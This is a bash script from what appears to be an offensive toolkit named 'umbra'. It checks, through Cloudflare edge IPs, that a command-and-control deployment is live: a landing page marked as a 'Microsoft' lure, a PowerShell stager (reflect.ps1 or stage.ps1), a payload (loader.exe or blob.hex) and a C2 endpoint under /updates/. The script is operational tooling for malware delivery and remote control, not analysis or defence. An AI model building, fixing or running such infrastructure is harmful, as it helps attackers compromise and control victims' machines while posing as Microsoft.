#!/usr/bin/env bash
# verify.sh - verify the PUBLIC edge the way the target sees it.
#
# Why this exists: if the box running this has a hosts-file entry (or a local DNS
# answer) that maps DOMAIN to the LAN IP (192.168.x.x), then a plain
# `curl https://DOMAIN/` talks to the local origin directly. It can then fail
# with "connection refused" (000) even though the public site is perfectly fine,
# or it can show a *different* app that happens to sit on that LAN IP (e.g.
# code-server). Neither proves anything about the tunnel.
#
# This script asks a public resolver (default 1.1.1.1) for the real Cloudflare
# edge IPs and then pins them with `curl --resolve DOMAIN:443:<edge-ip>`, so every
# request leaves the box and goes through Cloudflare - exactly like the target.
#
# Usage:
#   bash scripts/verify.sh
#   DOMAIN=docs.example.com bash scripts/verify.sh
#   DNS=8.8.8.8 bash scripts/verify.sh
#
# Exit code 0 only if every check passes.
set -uo pipefail
cd "$(dirname "$0")/.."

# --- shared session config ---------------------------------------------------
load_env() {
  local f="$1" line k v
  [ -f "$f" ] || return 0
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in ''|'#'*) continue ;; esac
    k="${line%%=*}"; v="${line#*=}"
    k="$(printf '%s' "$k" | tr -d '[:space:]')"
    [ -n "$k" ] || continue
    [ -n "${!k:-}" ] && continue
    case "$v" in
      \"*\") v="${v#\"}"; v="${v%\"}" ;;
      \'*\') v="${v#\'}"; v="${v%\'}" ;;
    esac
    export "$k=$v"
  done < "$f"
}
load_env scripts/umbra.env

DOMAIN="${DOMAIN:-c2.example.com}"
C2_PREFIX="${C2_PREFIX:-/updates/}"
DNS="${DNS:-1.1.1.1}"
PORT="${PORT:-443}"
MARKER="${MARKER:-Microsoft}"

# Which delivery chain is active? reflect (proven) publishes /reflect.ps1 +
# /loader.exe; stage publishes /stage.ps1 + /blob.hex. Checking the wrong pair
# reports a false failure (a stage asset 404s on a reflect deploy).
MODE="${MODE:-reflect}"
if [ "$MODE" = "stage" ]; then
  STAGE_PATH="${STAGE_PATH:-/stage.ps1}"
  PAYLOAD_PATH="${PAYLOAD_PATH:-/blob.hex}"
else
  STAGE_PATH="${STAGE_PATH:-/reflect.ps1}"
  PAYLOAD_PATH="${PAYLOAD_PATH:-/loader.exe}"
fi
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

pass=0 fail=0
ok()   { printf '[+] %s\n' "$*"; pass=$((pass+1)); }
bad()  { printf '[-] %s\n' "$*"; fail=$((fail+1)); }
warn() { printf '[!] %s\n' "$*"; }

command -v curl >/dev/null 2>&1 || { echo "[-] curl is required" >&2; exit 2; }

# --- discover the real edge IPs (bypasses /etc/hosts) ------------------------
EDGE_IPS=""
if command -v dig >/dev/null 2>&1; then
  EDGE_IPS="$(dig +short "@$DNS" "$DOMAIN" A 2>/dev/null | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' || true)"
fi
if [ -z "$EDGE_IPS" ] && command -v nslookup >/dev/null 2>&1; then
  # Parse the ANSWER section only. A plain `nslookup` also prints the resolver's
  # own address (e.g. 1.1.1.1) under "Address:", and with multiple records the
  # answer uses "Addresses:" - so matching "^Address: " would return the RESOLVER
  # IP and make every --resolve check fail with 000. Take everything after the
  # "Non-authoritative answer" marker instead, and never the resolver IP.
  _ns="$(nslookup "$DOMAIN" "$DNS" 2>/dev/null || true)"
  EDGE_IPS="$(printf '%s\n' "$_ns" | awk '
      /^[Nn]on-authoritative answer/ { ans=1; next }
      ans==1 { for (i=1;i<=NF;i++) if ($i ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) print $i }' \
      | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | grep -vx "$DNS" || true)"
fi
if [ -z "$EDGE_IPS" ] && command -v host >/dev/null 2>&1; then
  EDGE_IPS="$(host -t A "$DOMAIN" "$DNS" 2>/dev/null | awk '/has address/{print $NF}' \
      | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' || true)"
fi
EDGE_IPS="$(printf '%s\n' "$EDGE_IPS" | sort -u | sed '/^$/d')"

if [ -n "$EDGE_IPS" ]; then
  echo "[*] $DOMAIN edge IPs (via $DNS): $(printf '%s ' $EDGE_IPS)"
else
  warn "could not resolve $DOMAIN via $DNS - no dig/nslookup/host, or DNS blocked."
  warn "falling back to a direct request, which a local hosts entry CAN fool."
fi

# --- helpers: try each edge IP until one answers -----------------------------
# echo the HTTP status code for a path (empty body read)
code_of() { # $1=method $2=path [$3=extra curl args...]
  local method="$1" path="$2" ip c
  shift 2 || true
  if [ -n "$EDGE_IPS" ]; then
    for ip in $EDGE_IPS; do
      c="$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 \
            --resolve "$DOMAIN:$PORT:$ip" -X "$method" "$@" "https://$DOMAIN$path" 2>/dev/null || echo 000)"
      [ "$c" != "000" ] && { printf '%s' "$c"; return 0; }
    done
    printf '000'
  else
    curl -sk -o /dev/null -w '%{http_code}' --max-time 10 -X "$method" "$@" \
      "https://$DOMAIN$path" 2>/dev/null || echo 000
  fi
}

# fetch the body for a path (any edge IP), into a file
body_of() { # $1=path $2=outfile
  local path="$1" out="$2" ip
  if [ -n "$EDGE_IPS" ]; then
    for ip in $EDGE_IPS; do
      if curl -fsS --max-time 10 --resolve "$DOMAIN:$PORT:$ip" \
           "https://$DOMAIN$path" -o "$out" 2>/dev/null; then return 0; fi
    done
    return 1
  fi
  curl -fsS --max-time 10 "https://$DOMAIN$path" -o "$out" 2>/dev/null
}

echo
echo "[*] checking https://$DOMAIN (port $PORT)"
echo

# 1) the landing page answers and is OUR page (not code-server / a login page)
if body_of "/" "$TMP/index.html"; then
  if grep -q "$MARKER" "$TMP/index.html"; then
    ok "GET / -> 200 and contains the '$MARKER' marker (the umbra lure)"
  else
    title="$(grep -io '<title>[^<]*</title>' "$TMP/index.html" | head -n1)"
    bad "GET / -> 200 but '$MARKER' is missing. The edge is serving a DIFFERENT app."
    [ -n "$title" ] && warn "    page title: $title"
    warn "    Usually: the tunnel catch-all still points at an old port (code-server)."
    warn "    Check HTTP_PORT in scripts/umbra.env and re-run scripts/cf_tunnel.sh."
  fi
else
  bad "GET / -> no response from the edge (000). Tunnel down, or the hostname is not routed here."
fi

# 2) the stager for the active MODE is published
c="$(code_of GET "$STAGE_PATH")"
[ "$c" = "200" ] && ok "GET $STAGE_PATH -> 200" || bad "GET $STAGE_PATH -> $c (expected 200)"

# 3) the payload for the active MODE is published (loader.exe = reflect, blob.hex = stage)
c="$(code_of GET "$PAYLOAD_PATH")"
[ "$c" = "200" ] && ok "GET $PAYLOAD_PATH -> 200" || bad "GET $PAYLOAD_PATH -> $c (expected 200)"
[ "$MODE" != "stage" ] && warn "    (MODE=$MODE: /blob.hex is not used; set MODE=stage to verify it)" || true

# 4) the C2 path routes to the C2 (POST with a bad body => 401 from the handler,
#    whereas the static python server would answer 501 and the catch-all 404)
c="$(code_of POST "${C2_PREFIX}v2/sync" -d '')"
case "$c" in
  401|400) ok "POST ${C2_PREFIX}v2/sync -> $c (C2 reachable through the tunnel)" ;;
  501)     bad "POST ${C2_PREFIX}v2/sync -> 501: /updates/ is hitting the STATIC origin, not the C2." ;;
  404)     bad "POST ${C2_PREFIX}v2/sync -> 404: /updates/ is not routed to the C2 (fell through to catch-all)." ;;
  000)     bad "POST ${C2_PREFIX}v2/sync -> 000: no response." ;;
  *)       bad "POST ${C2_PREFIX}v2/sync -> $c (expected 401)" ;;
esac

# 5) the certificate is a Cloudflare EDGE certificate (only meaningful if
#    openssl is present). Cloudflare's Universal SSL is issued by three CAs:
#    "Cloudflare, Inc.", "Google Trust Services LLC" (intermediate WE1) and
#    DigiCert. Matching only the literal "Cloudflare" flags a perfectly normal
#    Google-Trust-Services edge cert as a false positive, so accept all three.
if command -v openssl >/dev/null 2>&1 && [ -n "$EDGE_IPS" ]; then
  ip="$(printf '%s\n' $EDGE_IPS | head -n1)"
  issuer="$(echo | openssl s_client -connect "$ip:$PORT" -servername "$DOMAIN" 2>/dev/null \
            | openssl x509 -noout -issuer 2>/dev/null || true)"
  case "$issuer" in
    *Cloudflare*|*"Google Trust Services"*|*DigiCert*)
        ok "TLS issuer is a Cloudflare Universal SSL CA ($issuer)" ;;
    "") warn "could not read the TLS issuer" ;;
    *)  warn "TLS issuer is not a known Cloudflare CA: $issuer" ;;
  esac
fi

echo
printf '[*] summary: %d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ] || exit 1
